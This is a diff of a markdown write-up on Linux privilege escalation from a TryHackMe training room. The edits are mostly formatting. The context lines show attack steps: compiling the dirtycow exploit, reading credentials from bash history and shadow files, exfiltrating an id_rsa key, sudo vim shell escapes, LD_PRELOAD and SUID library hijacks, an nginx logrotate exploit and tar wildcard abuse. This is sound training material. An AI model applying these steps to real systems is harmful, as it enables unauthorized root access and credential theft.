@@ -5,9 +5,6 @@ Once we have a limited shell it is useful to escalate that shells privileges. Th
 
 All the information provided is completely taken from the TryHackMe platform from the room Linux PrivEsc Arena by TCM, check out the room [Here](https://tryhackme.com/room/linuxprivescarena).  
 
-@Copyrights  
-TCM - The Cyber Mentor
-
 # Tools
 
 1. dirtycow
@@ -21,7 +18,7 @@ TCM - The Cyber Mentor
 
 # 1. Privilage Escalation- Kernel Exploit
 ## Detection
-1. `linux-exploit-suggester.sh `	{ suggests the expolits with cve }	>> vulnerable to dirtycow
+1. `linux-exploit-suggester.sh`	{ suggests the expolits with cve }	-->  **vulnerable to dirtycow**
 
 ## Exploitation
 1. `gcc -pthread c0w.c -o c0w`
@@ -44,7 +41,7 @@ command : `cat ~/.bash_history | grep -i passw`
 
 # 4. Privilage Escalation - Weak File Permissions
 ## Detection
-1. `ls -la /etc/shadow `		>> note the file permissions  
+1. `ls -la /etc/shadow`		--> note the **file permissions**  
 `-rw-rw-r-- 1 root shadow 809 Jun 17  2020 /etc/shadow`
 
 ## Exploitation
@@ -69,7 +66,7 @@ command : `cat ~/.bash_history | grep -i passw`
 ## Exploitation
 **Target box**
 
-1. Copy the contents of the discovered id_rsa file to a file on your attacker VM.
+1. Copy the contents of the discovered `id_rsa` file to a file on your attacker VM.
 
 **Attacker box**
 
@@ -118,7 +115,7 @@ d. `sudo vim -c '!sh' `
 **Target box**
 
 1. In command prompt type: `sudo -l`
-2. From the output, notice that the LD_PRELOAD environment variable is intact.
+2. From the output, notice that the **LD_PRELOAD** environment variable is intact.
 
 Exploitation
 
@@ -151,7 +148,7 @@ void _init() {
 2. From the output, make note of all the SUID binaries.
 3. In command line type:
 `strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"`
-4. From the output, notice that a .so file is missing from a writable directory.
+4. From the output, notice that a `.so` file is missing from a writable directory.
 
 ## Exploitation
 
@@ -188,14 +185,14 @@ void inject() {
 
 **Target box** – Terminal 1
 
-1. For this exploit, it is required that the user be www-data. To simulate this escalate to root by typing: su root
-2. Once escalated to root, in command prompt type: su -l www-data
+1. For this exploit, it is required that the user be www-data. To simulate this escalate to root by typing: `su root`
+2. Once escalated to root, in command prompt type: `su -l www-data`
 3. In command prompt type: `nginxed-root.sh /var/log/nginx/error.log`
 4. At this stage, the system waits for logrotate to execute. In order to speed up the process, this will be simulated by connecting to the Linux VM via a different terminal.
 
 **Target box** – Terminal 2
 
-1. Once logged in, type: su root
+1. Once logged in, type: `su root`
 2. As root, type the following: `invoke-rc.d nginx rotate >/dev/null 2>&1`
 3. Switch back to the previous terminal.
 
@@ -294,8 +291,8 @@ void inject() {
 
 1. In command prompt type: `cat /etc/crontab`
 2. From the output, notice the script “/usr/local/bin/compress.sh”
-3. In command prompt type: `cat /usr/local/bin/compress.sh`
-*4. From the output, notice the wildcard (*) used by ‘tar’. 
+3. In command prompt type: `cat /usr/local/bin/compress.sh`  
+4. From the output, notice the wildcard (*) used by **tar**. 
 
 ## Exploitation
 
